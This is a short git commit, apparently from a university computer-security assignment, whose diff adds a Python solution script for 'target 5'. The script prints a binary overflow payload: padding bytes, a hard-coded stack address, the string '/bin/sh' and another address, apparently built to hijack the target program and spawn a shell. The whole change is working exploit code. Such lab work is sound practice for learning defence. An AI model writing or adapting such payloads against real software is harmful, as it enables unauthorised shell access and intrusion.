51008a1ffbd287f3ce7300677aa41f1acdf01a99
yijo2004 <yijo@umich.edu>
2024-04-03 01:16:05 +0000

    target 5 done

--- sol5.py
+++ sol5.py
@@ -1,3 +1,9 @@
 #!/usr/bin/env python3
 
 import sys
+
+sys.stdout.buffer.write(b'A'*10)
+sys.stdout.buffer.write(b'\x00'*16)
+sys.stdout.buffer.write(0x7ffffff695c0.to_bytes(8,'little'))
+sys.stdout.buffer.write(b'/bin/sh\x00')
+sys.stdout.buffer.write(0x455050.to_bytes(8,'little'))
